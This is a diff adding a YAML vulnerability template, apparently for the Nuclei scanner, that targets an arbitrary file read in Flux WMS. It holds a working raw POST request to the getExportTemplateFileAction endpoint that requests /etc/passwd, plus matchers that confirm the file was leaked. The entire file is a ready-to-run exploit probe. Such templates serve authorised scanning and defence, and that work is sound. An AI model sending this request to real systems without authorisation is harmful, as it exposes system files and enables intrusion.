@@ -1,0 +1,37 @@
+id: poc-yaml-flux-wms-getexporttemplatefileaction-anyfile-read
+info:
+  name: Flux WMS getExportTemplateFileAction Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /expcenter/getExportTemplateFileAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dowmLoadUrl=/etc/passwd&fileName=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
